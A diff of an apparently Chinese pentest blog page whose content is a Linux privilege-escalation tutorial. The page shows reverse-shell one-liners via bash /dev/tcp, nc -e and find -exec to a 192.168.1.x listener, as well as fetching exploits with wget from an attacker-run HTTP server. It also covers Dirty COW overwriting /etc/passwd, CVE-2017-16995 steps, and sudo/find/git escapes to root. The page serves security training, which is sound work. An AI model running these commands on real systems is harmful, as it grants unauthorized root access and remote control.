 <h2 id="0x02-反弹shell命令"><a href="#0x02-反弹shell命令" class="headerlink" title="0x02 反弹shell命令"></a>0x02 反弹shell命令</h2><p>看这里：<a target="_blank" rel="noopener" href="https://www.yuque.com/uf9n1x/websec/iwqdgysqmsugxm41">https://www.yuque.com/uf9n1x/websec/iwqdgysqmsugxm41</a></p>
 <h2 id="0x03-一些小问题"><a href="#0x03-一些小问题" class="headerlink" title="0x03 一些小问题"></a>0x03 一些小问题</h2><h3 id="1、python实现交互式shell终端"><a href="#1、python实现交互式shell终端" class="headerlink" title="1、python实现交互式shell终端"></a>1、python实现交互式shell终端</h3><p>有些时候系统的命令终端不允许直接访问，可以使用python虚拟化一个终端来执行</p>
-<pre class="line-numbers language-shell"><code class="language-shell">python-c'importpty;pty.spawn("/bin/bash")'
-python3-c'importpty;pty.spawn("/bin/bash")'
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python-c'importpty;pty.spawn("/bin/bash")'</span><br><span class="line">python3-c'importpty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></tbody></table></figure>
+
 <p>使用su命令提示错误：</p>
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455777.png" alt="img"></p>
 <h3 id="2、解决linux反弹shell乱码"><a href="#2、解决linux反弹shell乱码" class="headerlink" title="2、解决linux反弹shell乱码"></a>2、解决linux反弹shell乱码</h3><p><strong>2.1.建立交互shell</strong></p>
-<pre class="line-numbers language-shell"><code class="language-shell">kali  nc -lvnp 2333
-目标 bash -i >& /dev/tcp/192.168.1.128/2333 0>&1
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali  nc -lvnp 2333</span><br><span class="line">目标 bash -i &gt;&amp; /dev/tcp/192.168.1.128/2333 0&gt;&amp;1</span><br></pre></td></tr></tbody></table></figure>
+
 <p><strong>2.2.使用python shell</strong></p>
-<pre class="line-numbers language-shell"><code class="language-shell">python -c 'import pty;pty.spawn("/bin/bash")'
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></tbody></table></figure>
+
 <p><strong>2.3.放置后台</strong></p>
 <p>crtl +z 放在后台<br><strong>2.4.设置格式</strong></p>
-<pre class="line-numbers language-shell"><code class="language-shell">stty raw -echo
-stty -echo raw//一样的
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stty raw -echo</span><br><span class="line">stty -echo raw//一样的</span><br></pre></td></tr></tbody></table></figure>
+
 <p><strong>2.5.fg命令再调用</strong>即可</p>
 <h2 id="0x04-Linux内核漏洞提权（-利用searchsploit搜索）"><a href="#0x04-Linux内核漏洞提权（-利用searchsploit搜索）" class="headerlink" title="0x04 Linux内核漏洞提权（ 利用searchsploit搜索）"></a>0x04 Linux内核漏洞提权（ 利用searchsploit搜索）</h2><p>通常我们在拥有一个webshell的时候，一般权限都是WEB容器权限，如在iis就是iis用户组权限，在<br>apache就是apache权限，一般都是权限较低，均可执行一些普通命令，如查看当前用户，网络信息，<br>ip信息等。如果我想进行内网渗透就必须将权限提权到最高，如系统权限超级管理员权限。</p>
 <h4 id="1-内核溢出提权"><a href="#1-内核溢出提权" class="headerlink" title="1. 内核溢出提权"></a>1. 内核溢出提权</h4><p> \1) 内核漏洞是最有效的提权方法。通杀的内核漏洞是十分少见的，因而我们应该先对系统相关的信息进行收集， 再搜索对应的exp进行提权攻击</p>
-<pre class="line-numbers language-shell"><code class="language-shell">//查看发行版本：这些命令作用都差不多，获取一些信息
-cat /etc/issue
-cat /etc/*-release
-cat /etc/redhat-release
-cat /proc/version
-lsb_release -a
-//查看内核版本
-uname -a
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//查看发行版本：这些命令作用都差不多，获取一些信息</span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">cat /etc/redhat-release</span><br><span class="line">cat /proc/version</span><br><span class="line">lsb_release -a</span><br><span class="line">//查看内核版本</span><br><span class="line">uname -a</span><br></pre></td></tr></tbody></table></figure>
+
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455827.png" alt="img"></p>
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455638.png" alt="img"></p>
 <p>\2) 利用kali自带的 searchsploit  来搜索对应版本的exp：（也可以直接去官网找<a target="_blank" rel="noopener" href="https://www.exploit-db.com/%EF%BC%89">https://www.exploit-db.com/）</a></p>
-<pre class="line-numbers language-shell"><code class="language-shell">searchspoit 发行版本内核版本
-searchsploit -t Ubuntu 16.04  //-t仅搜索漏洞标题
-searchsploit -s Ubuntu 16.04  //
-searchsploit -s Linux Kernel 4.15.0
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchspoit 发行版本内核版本</span><br><span class="line">searchsploit -t Ubuntu 16.04  //-t仅搜索漏洞标题</span><br><span class="line">searchsploit -s Ubuntu 16.04  //</span><br><span class="line">searchsploit -s Linux Kernel 4.15.0</span><br></pre></td></tr></tbody></table></figure>
+
 <p>3）找到可利用的脚本之后，查看路径信息，并复制一个到当前目录（别损坏了漏洞库中原文件）：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">searchsploit -x linux/local/47169.c
-cp /usr/share/exploitdb/exploits/linux/local/47169.c  ./
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -x linux/local/47169.c</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/47169.c  ./</span><br></pre></td></tr></tbody></table></figure>
+
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455669.png" alt="img"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455713.png" alt="img"></p>
 <p>4）之后就是将脚本上传到目标机，进行编译，赋权，执行了。</p>
 <p><strong>1.如果有其他webshell，有上传权限，那就把这个脚本拿出来，上传上去，再执行就好</strong>。</p>
 <p>**2.如果没有其他上传途径，可以在攻击方本地开一个http服务，让目标来下载也行：(**<strong>开的服务默认在根目录起始)</strong></p>
-<pre class="line-numbers language-shell"><code class="language-shell">python3 -m http-server  80
-或（python2）
-python -m SimpleHTTPServer 80
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http-server  80</span><br><span class="line">或（python2）</span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></tbody></table></figure>
+
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455874.png" alt="img"></p>
 <p>之后将脚本放到根目录，然后目标机来下载即可：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">wget http://192.168.1.130/47169.c -O /tmp/47169.c 
-//下载并保存到/tmp目录下
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>5）编译，加权限，执行</p>
-<pre class="line-numbers language-shell"><code class="language-shell">gcc 47169.c -o exp
-chmod +x exp
-./exp
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.1.130/47169.c -O /tmp/47169.c </span><br><span class="line">//下载并保存到/tmp目录下</span><br></pre></td></tr></tbody></table></figure>
 
-//id测试是否提权成功
-id
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>5）编译，加权限，执行</p>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcc 47169.c -o exp</span><br><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br><span class="line"></span><br><span class="line">//id测试是否提权成功</span><br><span class="line">id</span><br></pre></td></tr></tbody></table></figure>
+
 <h5 id="1-1-Linux-Exploit-Suggester"><a href="#1-1-Linux-Exploit-Suggester" class="headerlink" title="1.1 Linux_Exploit_Suggester"></a>1.1 Linux_Exploit_Suggester</h5><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p>
 <p>很好用的一款提权辅助工具，用法很简单，在靶机上执行./linux-exploit-suggester.sh就会列出该靶机上可利用的漏洞编号.</p>
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455344.png" alt="img"></p>
@@ -112,207 +68,132 @@ id
 <p>编译好的exp，包含Android平台与Linux平台版本</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/Brucetg/DirtyCow-EXP">https://github.com/Brucetg/DirtyCow-EXP</a></p>
 <p><strong>脏牛系统提权范围：****linux内核=&gt;2.6.22</strong></p>
-<pre class="line-numbers language-shell"><code class="language-shell">● RHEL7 Linux x86_64
-● RHEL4（4.4.7-16）
-● Debian 7（“wheel”）
-● Ubuntu 14.04.1 LTS
-● Ubuntu 14.04.5 LTS
-● Ubuntu 16.04.1 LTS
-● Ubuntu 16.10
-● Linux Mint 17.2
-铿锵版本 4.0.0；
-gcc 版本 6.2.0 20161005 (Ubuntu 6.2.0-5ubuntu12)
-gcc 版本 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.1)
-gcc 版本 4.8.5 20150623（红帽 4.8.5-4）（GCC）；
-gcc 版本 4.8.4 (Ubuntu 4.8.4);
-gcc 版本 4.8.2 (Ubuntu 4.8.2-19ubuntu1)
-gcc 版本 4.7.2 (Debian 4.7.2-5);
-gcc 版本 4.4.7（带有“旧”版本）
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">● RHEL7 Linux x86_64</span><br><span class="line">● RHEL4（4.4.7-16）</span><br><span class="line">● Debian 7（“wheel”）</span><br><span class="line">● Ubuntu 14.04.1 LTS</span><br><span class="line">● Ubuntu 14.04.5 LTS</span><br><span class="line">● Ubuntu 16.04.1 LTS</span><br><span class="line">● Ubuntu 16.10</span><br><span class="line">● Linux Mint 17.2</span><br><span class="line">铿锵版本 4.0.0；</span><br><span class="line">gcc 版本 6.2.0 20161005 (Ubuntu 6.2.0-5ubuntu12)</span><br><span class="line">gcc 版本 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.1)</span><br><span class="line">gcc 版本 4.8.5 20150623（红帽 4.8.5-4）（GCC）；</span><br><span class="line">gcc 版本 4.8.4 (Ubuntu 4.8.4);</span><br><span class="line">gcc 版本 4.8.2 (Ubuntu 4.8.2-19ubuntu1)</span><br><span class="line">gcc 版本 4.7.2 (Debian 4.7.2-5);</span><br><span class="line">gcc 版本 4.4.7（带有“旧”版本）</span><br></pre></td></tr></tbody></table></figure>
+
 <p><strong>漏洞成因：</strong></p>
 <p>Linux写时拷贝技术（copy-on-write）</p>
 <p>在Linux系统中，fork()会产生一个和父进程完全相同的子进程，但子进程在此后多会exec系统调用，出于效率考虑，Linux系统中引入了“写时复制”技术，也就是只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程。</p>
 <p><strong>演示：</strong></p>
 <h5 id="1）使用dirty-c脚本进行提权"><a href="#1）使用dirty-c脚本进行提权" class="headerlink" title="1）使用dirty.c脚本进行提权"></a><strong>1）使用dirty.c脚本进行提权</strong></h5><p>该漏洞利用dirtycow漏洞的pokemon漏洞利用作为基础，自动生成新的passwd行。运行二进制文件时，将提示用户输入新密码。然后将原始 /etc/passwd 文件备份到 /tmp/passwd.bak 并用生成的行覆盖 root 帐户。运行漏洞利用后，您应该能够使用新创建的用户登录。</p>
 <p>1.下载/上传该脚本到目标机下：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">git clone https://github.com/FireFart/dirtycow
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/FireFart/dirtycow</span><br></pre></td></tr></tbody></table></figure>
+
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455456.png" alt="img"></p>
 <p>2.编译该脚本：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">gcc -pthread dirty.c -o dirty -lcrypt
-1.-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告
-2.-pedantic 允许发出ANSI/ISO C标准所列出的所有警告
-3.-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高
-4.-std=c++11就是用按C++2011标准来编译的
-5.-pthread 在Linux中要用到多线程时，需要链接pthread库
-6.-o dcow gcc生成的目标文件,名字为dcow
-7.-lcrypt 添加需要的外部库
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">1.-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告</span><br><span class="line">2.-pedantic 允许发出ANSI/ISO C标准所列出的所有警告</span><br><span class="line">3.-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高</span><br><span class="line">4.-std=c++11就是用按C++2011标准来编译的</span><br><span class="line">5.-pthread 在Linux中要用到多线程时，需要链接pthread库</span><br><span class="line">6.-o dcow gcc生成的目标文件,名字为dcow</span><br><span class="line">7.-lcrypt 添加需要的外部库</span><br></pre></td></tr></tbody></table></figure>
+
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455596.png" alt="img"></p>
 <p>3.添加可执行权限并执行</p>
-<pre class="line-numbers language-shell"><code class="language-shell">chmod +x ./dirty
-./dirty 999999
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./dirty</span><br><span class="line">./dirty 999999</span><br></pre></td></tr></tbody></table></figure>
+
 <p> 4.之后就可以直接用密码999999登录root权限账户firefart</p>
-<pre class="line-numbers language-shell"><code class="language-shell">su firefart
-999999
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su firefart</span><br><span class="line">999999</span><br></pre></td></tr></tbody></table></figure>
+
 <p>\5. 不要忘记在运行漏洞利用后恢复您的 /etc/passwd  </p>
-<pre class="line-numbers language-shell"><code class="language-shell">mv /tmp/passwd.bak /etc/passwd
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /tmp/passwd.bak /etc/passwd</span><br></pre></td></tr></tbody></table></figure>
+
 <p> 原理是利用exp获取了写入权限后，对/etc/passwd进行备份，然后对/etc/passwd进行重写，修改账户权限。优点方便快速。缺点受限与环境影响。某些环境下会失败。如果失败还是使用官方放出的exp，对/etc/passwd进行写入，写入前一定要记得先备份！  </p>
 <h5 id="2）使用CVE-2016-5195提权"><a href="#2）使用CVE-2016-5195提权" class="headerlink" title="2）使用CVE-2016-5195提权"></a>2）<strong>使用CVE-2016-5195提权</strong></h5><p><a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p>
 <p>1.下载脚本到目标机器：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">git clone https://github.com/gbonacini/CVE-2016-5195.git
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/gbonacini/CVE-2016-5195.git</span><br></pre></td></tr></tbody></table></figure>
+
 <p> 2.编译成可执行文件</p>
-<pre class="line-numbers language-shell"><code class="language-shell">使用 g++ -Wall -PEDANTIC -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil 
-或者直接输入 make 进行 
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用 g++ -Wall -PEDANTIC -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil </span><br><span class="line">或者直接输入 make 进行 </span><br></pre></td></tr></tbody></table></figure>
+
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455820.png" alt="img"></p>
 <p>3.执行脚本</p>
-<pre class="line-numbers language-shell"><code class="language-shell">./dcow -s
-./dcow -h
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./dcow -s</span><br><span class="line">./dcow -h</span><br></pre></td></tr></tbody></table></figure>
+
 <h4 id="3-CVE-2017-16995-ubuntu内核漏洞"><a href="#3-CVE-2017-16995-ubuntu内核漏洞" class="headerlink" title="3.CVE-2017-16995 ubuntu内核漏洞"></a>3.CVE-2017-16995 ubuntu内核漏洞</h4><p><strong>1)影响版本</strong></p>
-<pre class="line-numbers language-shell"><code class="language-shell">Linux Kernel Version 4.14-4.4 （主要影响Debian和Ubuntu发行版，Redhat和CentOS不受影响）
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux Kernel Version 4.14-4.4 （主要影响Debian和Ubuntu发行版，Redhat和CentOS不受影响）</span><br></pre></td></tr></tbody></table></figure>
+
 <p>2)利用步骤</p>
-<pre class="line-numbers language-shell"><code class="language-shell">Linux本地内核提权 CVE-2017-16995
-从网上下载exp，或者kali导出exp上传到提权主机上。
-wget https://github.com/brl/grlh/archive/master.zip
-编译：
-gcc get-rekt-linux-hardened.c -o exp
-gcc 45010.c -o 45010   编译
-chmod +x 45010         增加权限
-./45010                         执行脚本返回root权限shell
-id
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Linux本地内核提权 CVE-2017-16995</span><br><span class="line">从网上下载exp，或者kali导出exp上传到提权主机上。</span><br><span class="line">wget https://github.com/brl/grlh/archive/master.zip</span><br><span class="line">编译：</span><br><span class="line">gcc get-rekt-linux-hardened.c -o exp</span><br><span class="line">gcc 45010.c -o 45010   编译</span><br><span class="line">chmod +x 45010         增加权限</span><br><span class="line">./45010                         执行脚本返回root权限shell</span><br><span class="line">id</span><br></pre></td></tr></tbody></table></figure>
+
 <h2 id="0x05-滥用sudo导致的提权-需要普通用户可以sudo执行某些命令，又名sudo-提权"><a href="#0x05-滥用sudo导致的提权-需要普通用户可以sudo执行某些命令，又名sudo-提权" class="headerlink" title="0x05 滥用sudo导致的提权(需要普通用户可以sudo执行某些命令，又名sudo 提权)"></a>0x05 滥用sudo导致的提权(需要普通用户可以sudo执行某些命令，又名sudo 提权)</h2><p><strong>以下这些程序如果被配置使用root权限启动，且该第三方服务或者程序存在漏洞或者配置问题，那么就可以被利用来获得root权限</strong>。 <strong>并且还要知道当前用户的密码</strong>  </p>
 <p> 可以利用sudo提权的命令如下  ：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">wget、find、cat、apt、zip、xxd、time、taskset、
-git、sed、pip、ed、tmux、scp、perl、bash、
-less、awk、man、vi、env、ftp
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget、find、cat、apt、zip、xxd、time、taskset、</span><br><span class="line">git、sed、pip、ed、tmux、scp、perl、bash、</span><br><span class="line">less、awk、man、vi、env、ftp</span><br></pre></td></tr></tbody></table></figure>
+
 <p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。换句话说通过此命令可以让非root的用户运行只有root才有权限执行的命令。</p>
 <p>是不是每一个新创建的用户都可以使用sudo提升命令的权限呢？如果不是那么哪些用户可以使用此命令呢？要想使一个用户具有使用sudo的能力，需要让root用户将其名字、可以执行的特定命令、按照哪种用户或用户组的身份执行等信息注册到/etc/sudoers文件中，即完成对该用户的授权（此时该用户称为“sudoer”）才可以。</p>
 <p>当一般用户执行特殊权限时，在命令前加上 sudo，此时系统会让你输入密码以确认终端机前操作的是你本人，确认后系统会将该命令的进程以超级用户的权限运行。</p>
 <p>在一定的时间段内，再次执行sudo的命令时不再询问密码，超出此时间段（一般为5分钟）后需要再次输入密码。</p>
 <p>在Linux/Unix中，/etc/sudoers文件是sudo权限的配置文件，其中储存了一些用户或组可以以root权限使用的命令。</p>
 <p>查看用户能以root权限运行的命令：列出目前的权限</p>
-<pre class="line-numbers language-shell"><code class="language-shell">sudo -l
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></tbody></table></figure>
+
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455336.png" alt="img"></p>
 <p>表示全可以执行</p>
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455204.png" alt="img"></p>
-<h3 id="01-git-提权"><a href="#01-git-提权" class="headerlink" title="01.git 提权"></a>01.git 提权</h3><pre class="line-numbers language-shell"><code class="language-shell">sudo git help add
-sudo git help config
-sudo git -p help
-//三选一
-输密码
-再
-!/bin/bash
-即可
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="01-git-提权"><a href="#01-git-提权" class="headerlink" title="01.git 提权"></a>01.git 提权</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo git help add</span><br><span class="line">sudo git help config</span><br><span class="line">sudo git -p help</span><br><span class="line">//三选一</span><br><span class="line">输密码</span><br><span class="line">再</span><br><span class="line">!/bin/bash</span><br><span class="line">即可</span><br></pre></td></tr></tbody></table></figure>
+
 <h3 id="02-find提权"><a href="#02-find提权" class="headerlink" title="02.find提权"></a>02.find提权</h3><p>普通用户find命令提权<strong>必要条件：find必须有s执行权限，有s表示可以提权</strong></p>
 <p>先查看find命令有没有提权的可能:</p>
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455246.png" alt="img"></p>
 <p> 尝试执行whoami  :</p>
-<pre class="line-numbers language-shell"><code class="language-shell">find / -type f -name getroot -exec "whoami" \;
-这里的反斜杠\是用来转义分号;的
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -name getroot -exec "whoami" \;</span><br><span class="line">这里的反斜杠\是用来转义分号;的</span><br></pre></td></tr></tbody></table></figure>
+
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455375.png" alt="img"></p>
 <p> 尝试调出一个交互式的bin/sh并且是root权限  </p>
-<pre class="line-numbers language-shell"><code class="language-shell">sudo find /home -exec /bin/bash \;
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /home -exec /bin/bash \;</span><br></pre></td></tr></tbody></table></figure>
+
 <p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161455316.png" alt="img"></p>
 <p>   此shell 为不完整的shell， 升级交互式。</p>
-<pre class="line-numbers language-shell"><code class="language-shell">#在反弹shell上执行
-[root@localhost ~]# python -c 'import pty; pty.spawn("/bin/bash")'  
-[root@localhost ~]# ctrl +z 按键。挂起正在运行的程序
-[kali机器 ~]# stty raw -echo
-# 输入这个命令 在输入命令终端不再显示
-[kali机器 ~]#fg
-# 把后台挂起的程序，放入到控制台。终端不再显示命令，输入后回撤
-[root@localhost ~]# reset
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在反弹shell上执行</span></span><br><span class="line">[root@localhost ~]# python -c 'import pty; pty.spawn("/bin/bash")'  </span><br><span class="line">[root@localhost ~]# ctrl +z 按键。挂起正在运行的程序</span><br><span class="line">[kali机器 ~]# stty raw -echo</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输入这个命令 在输入命令终端不再显示</span></span><br><span class="line">[kali机器 ~]#fg</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把后台挂起的程序，放入到控制台。终端不再显示命令，输入后回撤</span></span><br><span class="line">[root@localhost ~]# reset</span><br></pre></td></tr></tbody></table></figure>
+
 <p><strong>用find进行反弹shell</strong></p>
-<pre class="line-numbers language-shell"><code class="language-shell">find /etc/passwd -exec bash -ip >& /dev/tcp/192.168.1.130/2333 0>&1 \;
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc/passwd -exec bash -ip &gt;&amp; /dev/tcp/192.168.1.130/2333 0&gt;&amp;1 \;</span><br></pre></td></tr></tbody></table></figure>
+
 <p><strong>利用find+nc反弹shell</strong></p>
-<pre class="line-numbers language-shell"><code class="language-shell">find /var/www/dirty -exec nc 192.168.1.130 2333 -t -e /bin/sh \;
-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/dirty -exec nc 192.168.1.130 2333 -t -e /bin/sh \;</span><br></pre></td></tr></tbody></table></figure>
+
 <p><strong>find+python进行反弹shell</strong></p>
